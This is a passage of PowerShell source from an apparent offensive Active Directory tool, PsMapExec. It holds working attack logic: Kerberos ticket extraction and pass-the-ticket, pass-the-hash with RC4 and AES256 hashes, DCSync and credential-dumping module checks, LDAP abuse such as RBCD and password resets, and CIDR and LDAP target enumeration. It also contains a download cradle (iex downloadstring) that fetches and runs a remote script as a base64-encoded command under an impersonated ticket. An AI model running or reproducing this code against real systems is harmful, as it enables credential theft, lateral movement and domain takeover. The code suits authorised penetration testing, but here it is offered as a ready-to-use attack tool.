    # Rainbow Module Check
    if ($Rainbow) {
        if ($Module -ne "Sam" -and $Module -ne "LogonPasswords" -and $Module -ne "NTDS") {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "The switch -Rainbow is only compatible with the Modules 'LogonPasswords', 'NTDS', and 'SAM'"
            return
        }
    }

    # Kerberoast Method Check
    if ($Method -eq "Kerberoast") {
        if ($Module -ne "") {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Incorrect parameters for -Method Kerberoast"
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Example:  PsMapExec -Method Kerberoast"
            return
        }
    }

    if ($Method -eq "DCSync") {
        if ($Targets -match '^[0-9./]+$') {
    
            Write-Host "[-] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Use a FQDN or hostname for DCSync instead of IP"
    
            return
        }
    }

    # Check if LocalAuth conflicts with anything
    if ($LocalAuth) {
        $CurrentUser = $True
    }


    # LDAP / LDAPS pre-flight checks

    if ($Method -eq "LDAPS") {
        $LDAPS = $true 
    }

    else {

        $LDAPS = $false

    }

    $LDAPModules = @("whoami", "MAQ", "AddSPN", "RemoveSPN", "AddToGroup", "RemoveFromGroup", "ToggleAccount", "ResetPassword", "AddComputer", "RemoveComputer", "Elevate")

    if ($LDAPModules -contains $Module -and $Method -notin @("LDAP", "LDAPS")) {
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Module '$Module' requires LDAP (PsMapExec LDAP -Targets DC01 -Module $Module)"
        return
    }

    if (@("AddRBCD", "RemoveRBCD", "AddSPN", "RemoveSPN", "AddToGroup", "RemoveFromGroup", "ToggleAccount", "ResetPassword", "RemoveComputer", "Elevate") -contains $Module -and !$TargetDN) {
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Module '$Module' requires -TargetDN (Specify target DN)"
        return
    }

    if (@("AddToGroup", "RemoveFromGroup") -contains $Module -and !$GroupDN) {
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Module '$Module' requires -GroupDN (Specify group DN)"
        return
    }

    if ($Module -eq "AddRBCD" -and !$SID) {
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline
        Write-Host "A SID is required to grant rights to ""-SID S-1-5-21-13999771-..."""
        return
    }



    ################################################################################################################
    ########################################### Current User Ticket ################################################
    ################################################################################################################

    # Check if the current user is an administrator, used for ticket functions
    $CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    function GetCurrentUserTicket {
        $Local:ErrorActionPreference = "SilentlyContinue"
    
        #Invoke-Expression -Command $Global:rbs

        if ($Method -ne "RDP") {
            if ($Method -ne "MSSQL") {
                if (!$Global:SkipRestoreTicket) {
                    if ($Klist) {
                        try {
                            Write-Log -Message  "Attempting to obtain current user ticket"
                            if ($DomainController -ne "") {
                                $BaseTicket = Invoke-rTickets send /domain:$domain /dc:$DomainController /nowrap | Out-String
                                Write-Log -Message  "[GUCT] (1) "
                            }
                            else {
                                $BaseTicket = Invoke-rTickets send /nowrap /domain:$domain | Out-String
                                Write-Log -Message  "[GUCT] (2) "
                            }

                            # Inner try block to handle specific conditions
                            try {
                                if ($BaseTicket -like "*No target SPN specified*") {
                                    Write-Log -Message  "[GUCT] Error, trying a different method"
                                    throw
                                }
                            }
                            catch {
                                # Re-throw the exception to be caught by the outer catch
                                throw
                            }

                            $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                            Write-Log -Message  "[GUCT] (3) "
                        }
                        catch {
                            # This is the first (outer) catch block where the exception is ultimately handled
                            if (!$CheckAdmin) {
                                $BaseTicket = Invoke-rTickets get /service:krbtgt /nowrap | Out-String
                                $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                                Write-Log -Message  "[GUCT] (4) "

                                if ($Global:OriginalUserTicket -notlike "doI*") {
                                    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                                    Write-Host "Unable to retrieve any Kerberos tickets"
                                    break
                                }
                            }
                            elseif ($CheckAdmin) {
                                $BaseTicket = Invoke-rTickets get /service:krbtgt /username:$env:username /nowrap | Out-String
                                $Global:OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                                Write-Log -Message  "[GUCT] (5) "

                                if ($Global:OriginalUserTicket -notlike "doI*") {
                                    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                                    Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
                                    break
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    ################################################################################################################
    ################################################# Function: RestoreTicket ######################################
    ################################################################################################################

    function RestoreTicket {

        # Skip function execution if credentials are invalid or the global skip condition is set.
        if (-not $InvalidCredentials) {
            if ($Method -eq "Inject") {
                $Global:SkipRestoreTicket = $true
            }

            if ($Global:SkipRestoreTicket) {
                Write-Log -Message  "[Function: RestoreTicket] Skipping RestoreTicket function as per global condition."
                $Global:SkipRestoreTicket = $false  # Reset the global variable immediately after use
                return
            }
        }

        # Execute the main logic only if there's no current user context
        if (-not $CurrentUser) {
            Write-Log -Message  ""
            Write-Log -Message  "[Function: RestoreTicket] Restoring Ticket"
            klist purge | Out-Null  # Purge tickets for both conditions
            Start-Sleep -Milliseconds 100
        
            if ($DomainController) {
                Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /dc:$DomainController | Out-Null
            }
            else {
                Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket | Out-Null
            }
        }
    }

    ################################################################################################################
    ########################################### Ticket processing ##################################################
    ################################################################################################################

    function ReplicateCasing {
        param ([string]$Username, [string]$Domain)

        $searcher = [System.DirectoryServices.DirectorySearcher]"LDAP://$Domain"
        $searcher.Filter = "(&(objectClass=user)(sAMAccountName=$Username))"
        $searcher.PropertiesToLoad.AddRange(@("sAMAccountName"))

        $user = $searcher.FindOne()
        if ($user) {
            return $user.Properties["sAMAccountName"][0].ToString()
        }

        else { return $Username }
    }


    
    function ProcessTicket {
    
        Write-Host
    
        if ($Method -ne "RDP") {
        
            # Check if a ticket has been provided
            if ($Ticket -ne "") {
                if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
                    $Ticket = Get-Content -Path $Ticket -Raw
                }

                $ProvidedTicket = Invoke-rTickets explain /ticket:$Ticket
            
                # Check if an error has occurred
                if ($ProvidedTicket -like "*/ticket:X*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Invalid ticket provided"
                    break
                }
            
                elseif ($ProvidedTicket -like "*Asn1.AsnException: value overflow*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Invalid ticket provided"
                    break
                }

                # Use regular expressions to extract ticket information
                $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
                $TicketRealm = [regex]::Match($ProvidedTicket, "UserDomain\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
                $TicketExpiry = [regex]::Match($ProvidedTicket, "End\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
                $TicketType = [regex]::Match($ProvidedTicket, "NameService\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value

                # Display the extracted information
                Write-Host
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Supplied Ticket Details"

                if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
                if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }

                Write-Host "    - UserName : $TicketUsername"
                Write-Host "    - Realm    : $TicketRealm"
                Write-Host "    - Expires  : $TicketExpiry"

                # Attempt to inject the ticket into the current session
                if ($DomainController -ne "") {
                    $InjectTicket = Invoke-rTickets ptt /ticket:$Ticket /domain:$Domain /dc:$DomainController
                }
                else {
                    $InjectTicket = Invoke-rTickets ptt /ticket:$Ticket /domain:$Domain
                }

                if ($InjectTicket -like "*Error 1398*") {
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "Ticket expired"
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }
            }





            elseif ($Password -ne "") {
                $Username = ReplicateCasing -Username $Username -Domain $Domain
                klist purge | Out-Null

                if ($UserDomain -ne "") {
                    if ($DomainController -ne "") {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /dc:$DomainController /opsec /force /ptt
                    }
                    else {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt

                    }
                }
                elseif ($UserDomain -eq "") {
                    if ($DomainController -ne "") {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /dc:$DomainController /opsec /force /ptt
                    }
                    else {
                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt
                    }
                }

                Write-Log -Message  $AskPassword

                if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect password or username"
                    $InvalidCredentials = $true
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*NOWN*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Principal not found"
                    $InvalidCredentials = $true
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*NOTSUPP*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "RC4 not supported in domain or for this account"
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                    $InvalidCredentials = $true
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*Unhandled rTickets exception:*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Incorrect password or username"
                    $InvalidCredentials = $true
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }

                if ($AskPassword -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Try with a AES256 hash instead"
                    klist purge | Out-Null
                    RestoreTicket
                
                    break
                }
            } 
        
            elseif ($Hash -ne "") {
                $Username = ReplicateCasing -Username $Username -Domain $Domain
                
                if ($Hash.Length -eq 32) {
                    klist purge | Out-Null
                    Write-Log -Message  "Type Hash:32"

                    if ($UserDomain -ne "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt
                        }
                    }
                    if ($UserDomain -eq "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt
                        }
                    }

                    Write-Log -Message  $AskRC4

                    if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($AskRC4 -like "*NOWN*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Principal not found"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($AskRC4 -like "*NOTSUPP*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "RC4 not supported in domain or for this account"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                        
                        break
                    }
                
                    if ($AskRC4 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try with a AES256 hash instead"
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }
                }
                elseif ($Hash.Length -eq 64) {
                    klist purge | Out-Null
                    Write-Log -Message  "Type Hash:64"

                    if ($UserDomain -ne "") {
                        if ($DomainController -ne "") {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
                        }
                        else {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /aes256:$Hash /opsec /force /ptt
                        }
                    }
                    elseif ($UserDomain -eq "") {
                        if ($DomainController -ne "") {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
                        }
                        else {
                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt
                        }
                    }

                    Write-Log -Message  $Ask256

                    if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($Ask256 -like "*NOWN*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Principal not found"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($Ask256 -like "*NOTSUPP*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "RC4 not supported in domain or for this account"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($Ask256 -like "*Unhandled rTickets exception:*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($Ask256 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                
                
                }
                elseif ($Hash.Length -eq 65) {
                    $colonCount = ($Hash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
                    
                    if ($colonCount -ne 1) {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
                        Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
                        break
                    }
                
                    $Hash = $Hash.Split(':')[1]

                    klist purge | Out-Null
                    Write-Log -Message  "Type Hash:65"
                
                    if ($UserDomain -ne "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt
                        }
                    }
                    if ($UserDomain -eq "") {
                        if ($DomainController -ne "") {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                        }
                        else {
                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt
                        }
                    }
                
                    Write-Log -Message  $AskRC4
                
                    if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                    
                        break
                    }

                    if ($AskRC4 -like "*NOWN*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Principal not found"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }

                    if ($AskRC4 -like "*NOTSUPP*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "RC4 not supported in domain or for this account"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }
                
                    if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Incorrect hash or username"
                        $InvalidCredentials = $true
                        klist purge | Out-Null
                        RestoreTicket
                        
                        break
                    }
                
                    if ($AskRC4 -like "*Supplied encyption key type is rc4_hmac but AS-REP contains data encrypted with aes256_cts_hmac_sha1*") {
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "The encryption key is rc4_hmac, but the AS-REP uses aes256_cts_hmac_sha1 (Preauth Error)"
                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                        Write-Host "Try with a AES256 hash instead of NTLM"
                        klist purge | Out-Null
                        RestoreTicket
                
                        break
                    }
                }
                else {
                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "Supply either a 32-character RC4/NT hash, 64-character AES256 hash or a NTLM hash"
                    Write-Host 
                    Write-Host
                
                    break
                }

            }
        }

        if ($Method -eq "Inject") {
            Write-Log -Message  "[Function: ProcessTicket] Injecting Ticket"
            RestoreTicket
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-host "Ticket Successfuly Injected"
            break
        }
    }

    ################################################################################################################
    ############################################## Load Amnesiac ###################################################
    ################################################################################################################

    if ($Module -eq "Amnesiac") {
        if ([string]::IsNullOrEmpty($Global:AmnesiacPID) -or (Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -eq $null) {
            $Global:PN = $null
            $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join ''
        
            if (!$Global:SID) {
                $Global:SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
            }
        
            $finalcommand = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac -ScanMode -GlobalPipeName $PN"
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))

            if (!$CurrentUser) {
                Write-Log -Message  "Starting Amnesiac with impersonation"
                GetCurrentUserTicket
                $process = Invoke-rTickets startonlynet /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /username:$env:Username /password:Fakepass /domain:$Domain /show /ptt /ticket:$Global:OriginalUserTicket
                Write-Log $Process
                Write-Log ""
                $pattern = "\sProcessID\s+:\s+(\d+)"
            
                # Find the created process ID
                $match = [regex]::Match($process, $pattern)
                if ($match.Success) {
                    $Global:AmnesiacPID = $match.Groups[1].Value
                } 
            }
        
            if ($CurrentUser) {
                Write-Log -Message  "Starting Amnesiac without impersonation"
                $process = Start-Process cmd.exe -ArgumentList "/c powershell.exe -ep bypass -c `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac -ScanMode -GlobalPipeName $PN`"" -PassThru
                $Global:AmnesiacPID = $process.Id
            }
        }
        else {
            Write-Log -Message  "Amnesiac is already running"
            if ($Scramble) { $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join '' }
            elseif ((Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -ne $null) {
                $Global:PN = $Global:PN
            }
            else {
                $Global:AmnesiacPID = $null
            }
        }
    }

    ################################################################################################################
    ######################################### Console Display variables ############################################
    ################################################################################################################

    function Resolve-DnsNameWithTimeout {
        param(
            [string]$IPAddress,
            [int]$Timeout
        )
        if ($Method -eq "IPMI") { Write-Host ("{0}" -f "") -NoNewline ; return }
        try {
            $timeoutTask = [timespan]::FromMilliseconds($Timeout)
            $task = [System.Net.Dns]::GetHostEntryAsync($IPAddress)

            $sw = [System.Diagnostics.Stopwatch]::StartNew()

            if ($task.Wait($timeoutTask)) {
                $sw.Stop() # Stop the stopwatch
                Write-Host ("{0,-44}" -f $($task.Result.HostName)) -NoNewline
            }
            else {
                $sw.Stop()
                Write-Host ("{0,-44}" -f "") -NoNewline
            }
        }
        catch {
            Write-Host ("{0,-44}" -f "") -NoNewline
        } 
    }
    
    function Display-ComputerStatus {
        param (
            [string]$ComputerName,
            [string]$OS,
            [System.ConsoleColor]$statusColor = 'White',
            [string]$statusSymbol = "",
            [string]$statusText = "",
            [int]$NameLength,
            [int]$OSLength,
            [string]$successfulProtocols
        )

        # Prefix
        switch ($Method) {
            "DCSync" { Write-Host "DCSync" -ForegroundColor "Yellow" -NoNewline }
            "LDAP" { Write-Host "LDAP" -ForegroundColor "Yellow" -NoNewline }
            "LDAPS" { Write-Host "LDAPS" -ForegroundColor "Yellow" -NoNewline }
            "SMB" { Write-Host "SMB" -ForegroundColor "Yellow" -NoNewline }
            "WMI" { Write-Host "WMI" -ForegroundColor "Yellow" -NoNewline }
            "WinRM" { Write-Host "WinRM" -ForegroundColor "Yellow" -NoNewline }
            "All" { Write-Host "ALL" -ForegroundColor "Yellow" -NoNewline }
            "GenRelayList" { Write-Host "GenRelayList" -ForegroundColor "Yellow" -NoNewline }
            "SessionHunter" { Write-Host "SessionHunter" -ForegroundColor "Yellow" -NoNewline }
            "VNC" { Write-Host "VNC" -ForegroundColor "Yellow" -NoNewline }
            "IPMI" { Write-Host "IPMI" -ForegroundColor "Yellow" -NoNewline }
        }
    
        Write-Host "   " -NoNewline

        if (!$IPAddress) {
            # Resolve IP
            $IP = $null
            $Ping = New-Object System.Net.NetworkInformation.Ping
            $Result = $Ping.Send($ComputerName, 15)
            if ($Result.Status -eq 'Success') {
                $IP = $Result.Address.IPAddressToString
                Write-Host ("{0,-16}" -f $IP) -NoNewline
            }
            else {
                Write-Host ("{0,-16}" -f $IP) -NoNewline
            }
        }
        elseif ($IPAddress) {

            Resolve-DnsNameWithTimeout -IPAddress $ComputerName -Timeout 5000
        }


        # IP Address in use, display nothing in column
        else {}

        # Display ComputerName and OS
        Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
        Write-Host "   " -NoNewline
        if (!$IPAddress) { Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline }
        Write-Host "   " -NoNewline

        # Display status symbol and text
        Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
        Write-Host $statusText
    }


    ################################################################################################################
    ##################################### Ticket logic for authentication ##########################################
    ################################################################################################################
    # Set the userDomain when impersonating a user in one domain for access to an alternate domain
    # Can't remember where I was going with this...
    if ($UserDomain -ne "") {}

    if (!$CurrentUser -and $Module -ne "Amnesiac") { Write-Log -Message  "Obtaining current user ticket" ; GetCurrentUserTicket }
    if (!$CurrentUser) { Write-Log -Message  "Processing ticket" ; ProcessTicket }

    ################################################################################################################
    ########################################## Domain Target Acquisition ###########################################
    ################################################################################################################

    $ComputerTargetMethods = @("SMB", "WMI", "SessionHunter", "WinRM", "RDP", "VNC", "IPMI", "MSSQL", "GenRelayList", "All", "DCSync", "LDAP", "LDAPS")
    $UserTargetMethods = @("Kerberoast", "Spray")



    function New-Searcher {
        #Write-Log -Message "Initialising New-Searcher" -Function "New-Searcher"
    
        $directoryEntry = [ADSI]"LDAP://$domain"
        $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
        $searcher.PageSize = 1000
        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
        return $searcher
    }


    function CheckTargetTypeIPCIDR {
        param (
            [string]$Targets
        )
        Write-Log -Message "Initialising CheckTargetTypeIPCIDR " -Function "CheckTargetTypeIPCIDR"
        Write-Log -Message "Evaluating target type for $Targets" -Function "CheckTargetTypeIPCIDR"

        if ($Targets -match "^(\d{1,3}\.){3}\d{1,3}/\d{1,2}$") {
            Write-Log -Message "Target identified as CIDR" -Function "CheckTargetTypeIPCIDR"
            return "CIDR"
        }
        elseif ($Targets -match "^(\d{1,3}\.){3}\d{1,3}$") {
            Write-Log -Message "Target identified as IP address" -Function "CheckTargetTypeIPCIDR"
            return "IPAddress"
        }
        else {
            Write-Log -Message "Target identified as LDAP Query" -Function "CheckTargetTypeIPCIDR"
            return "LDAP Query"
        }
    }

    function Get-IPRange {
        param (
            [string]$Targets
        )
    
        Write-Log -Message "Initialising Get-IPRange" -Function "Get-IPRange"
        $ErrorActionPreference = "Stop"
        try {
            Write-Log -Message "Processing IP range for $Targets" -Function "Get-IPRange"
        
            if ($Targets -like "*/*") {
                # CIDR range
                $baseIP, $prefixLength = $Targets -split "/"
            
                # Validate the base IP and prefix length
                if (-not ($baseIP -match "^(\d{1,3}\.){3}\d{1,3}$") -or -not ($prefixLength -match "^\d{1,2}$") -or ([int]$prefixLength -lt 16 -or [int]$prefixLength -gt 32)) {
                    Write-Error "Invalid CIDR format or prefix length. Ensure you use a prefix between /16 and /32"
                    RestoreTicket
                }

                # Generate all IP addresses within the range
                $ipCount = [math]::Pow(2, (32 - [int]$prefixLength))
                $ipBytes = [System.Net.IPAddress]::Parse($baseIP).GetAddressBytes()
                [Array]::Reverse($ipBytes)
                $ipDecimal = [BitConverter]::ToUInt32($ipBytes, 0)
                [array]$Computers = 0..($ipCount - 1) | ForEach-Object {
                    $currentIPDecimal = $ipDecimal + $_
                    $currentIPBytes = [BitConverter]::GetBytes($currentIPDecimal)
                    [Array]::Reverse($currentIPBytes)
                    "$($currentIPBytes[0]).$($currentIPBytes[1]).$($currentIPBytes[2]).$($currentIPBytes[3])"
                }
            
                Write-Log -Message "CIDR range processed into IP addresses" -Function "Get-IPRange"
                [array]$Computers = [array]$Computers
                $LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -ExpandProperty IPAddress)
            
                foreach ($Address in $LocalIP) {
                    [array]$Computers = [array]$Computers | Where-Object { $_ -ne $Address }
                }
            
                $IPAddress = $true
            
            
            }
            elseif ($Targets -match "^(\d{1,3}\.){3}\d{1,3}$") {
                # Single IP address
                Write-Log -Message "Processing single IP address: $Targets" -Function "Get-IPRange"
                [array]$Computers = @($Targets)  # Ensure [array]$Computers is an array
                $IPAddress = $true
            }
            else {
                # It's a string meant for LDAP processing
                Write-Log -Message "Target identified as a non-IP address for LDAP processing" -Function "Get-IPRange"
                [array]$Computers = $null
                $IPAddress = $false
            }
        
            return @($Computers, $IPAddress)
        }
        catch {
            Write-Error "An error occurred: $_"
            return @($null, $false)  # Return null to indicate error
        }
    }

    # Evaluate $Targets before processing
    if ($Method -in $ComputerTargetMethods) {
        Write-Log -Message "Starting target evaluation" -Function "Main"
        $type = CheckTargetTypeIPCIDR -Targets $Targets

        if ($type -eq "CIDR" -or $type -eq "IPAddress") {
            $IPorCIDRResults = Get-IPRange -Targets $Targets
            [array]$Computers = $IPorCIDRResults[0]
            $IPAddress = $IPorCIDRResults[1]
        }
        elseif ($type -eq "LDAP Query") {
            Write-Log -Message "Target is for LDAP Query" -Function "Main"
            [array]$Computers = $null
            $IPAddress = $false
        }
    }


    function Gather-LDAPComputers {
        Write-Log -Message "Initializing Gather-LDAPComputers" -Function Gather-LDAPComputers

        Write-Log "Performing initial LDAP query for all enabled computers." -Function Gather-LDAPComputers
        $searcher = New-Searcher
        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

        # Query all computers and categorize them
        $allComputers = $searcher.FindAll() | Where-Object {
            $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
        }

        # Assign to global variables based on category
        $Global:TargetsAll = $allComputers | Select-Object -Unique *

